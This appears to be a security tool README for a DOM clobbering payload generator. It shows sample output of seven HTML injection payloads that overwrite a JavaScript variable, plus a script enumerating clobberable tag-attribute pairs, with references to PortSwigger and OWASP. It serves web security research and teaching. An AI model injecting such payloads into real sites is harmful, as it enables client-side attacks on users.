# DOM Clobbering Generator

Full article on [OffensiveWeb](https://www.offensiveweb.com/docs/topics/dom-clobbering/).

## Usage

```bash
$ python3 generator.py video.lang 'Hello!'
********************* INFO **********************
ALLOWED_ELEMENTS = ['a', 'form', 'input', 'iframe']
variable_name = 'video.lang'
variable_value = 'Hello!'
depth = 2
document_scope = False
chrome_required = True
******************** PAYLOAD #1 ********************
<a id="video" lang="Hello!"></a>
******************** PAYLOAD #2 ********************
<form id="video" lang="Hello!"></form>
******************** PAYLOAD #3 ********************
<form name="video" lang="Hello!"></form>
******************** PAYLOAD #4 ********************
<input id="video" lang="Hello!"></input>
******************** PAYLOAD #5 ********************
<iframe id="video" lang="Hello!"></iframe>
******************** PAYLOAD #6 ********************
<iframe name="video" lang="Hello!"></iframe>
******************** PAYLOAD #7 ********************
<a id="video"></a><a id="video" name="lang" href="a:Hello!"></a>
```

## attributes.json 

```js
const tags = ["a", "abbr", "acronym", "address", "applet", "area", "article", "aside", "audio", "b", "base", "bdi", "bdo", "bgsound", "big", "blink", "blockquote", "body", "br", "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "data", "datalist", "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "em", "embed", "fieldset", "figcaption", "figure", "font", "footer", "form", "frame", "frameset", "h1", "head", "header", "hgroup", "hr", "html", "i", "iframe", "image", "img", "input", "ins", "kbd", "keygen", "label", "legend", "li", "link", "main", "map", "mark", "marquee", "menu", "menuitem", "meta", "meter", "nav", "nobr", "noembed", "noframes", "noscript", "object", "ol", "optgroup", "option", "output", "p", "param", "picture", "plaintext", "portal", "pre", "progress", "q", "rb", "rp", "rt", "rtc", "ruby", "s", "samp", "script", "section", "select", "slot", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "title", "tr", "track", "tt", "u", "ul", "var", "video", "wbr", "xmp"];
const attributes = ["accept", "accept-charset", "accesskey", "action", "align", "allow", "alt", "async", "autocapitalize", "autocomplete", "autofocus", "autoplay", "background", "bgcolor", "border", "buffered", "capture", "challenge", "charset", "checked", "cite", "class", "code", "codebase", "color", "cols", "colspan", "content", "contenteditable", "contextmenu", "controls", "coords", "crossorigin", "csp", "data", "data-*", "datetime", "decoding", "default", "defer", "dir", "dirname", "disabled", "download", "draggable", "enctype", "enterkeyhint", "for", "form", "formaction", "formenctype", "formmethod", "formnovalidate", "formtarget", "headers", "height", "hidden", "high", "href", "hreflang", "http-equiv", "id", "integrity", "intrinsicsize", "inputmode", "ismap", "itemprop", "keytype", "kind", "label", "lang", "language", "loading", "list", "loop", "low", "manifest", "max", "maxlength", "minlength", "media", "method", "min", "multiple", "muted", "name", "novalidate", "open", "optimum", "pattern", "ping", "placeholder", "playsinline", "poster", "preload", "readonly", "referrerpolicy", "rel", "required", "reversed", "role", "rows", "rowspan", "sandbox", "scope", "scoped", "selected", "shape", "size", "sizes", "slot", "span", "spellcheck", "src", "srcdoc", "srclang", "srcset", "start", "step", "style", "summary", "tabindex", "target", "title", "translate", "type", "usemap", "value", "width", "wrap"];

let valids = {};
tags.forEach(tag => {
	attributes.forEach(attribute => {
		if (attribute != "id" && attribute != "name") {
			document.body.innerHTML = `<${tag} id="xyz" ${attribute}="xanhacks"></${tag}>`;
			try {
				if (eval(`xyz.${attribute} == "xanhacks"`)) {
					if (!valids.hasOwnProperty(tag)) {
						valids[tag] = [];
					}
					valids[tag].push(attribute);
				}
			} catch (e) {}
		}
	});
});
console.log(valids);
```

## References

- [PortSwigger - DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- JavaScript for hackers - Gareth Heyes (book)
- [OWASP CS - DOM Clobbering](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
- [DOM Clobbering - Frederik Braun](https://www.htmhell.dev/adventcalendar/2022/12/)
- [WHATWG - Named access on the Window object](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object)
- [It’s (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses](https://scnps.co/papers/sp23_domclob.pdf)
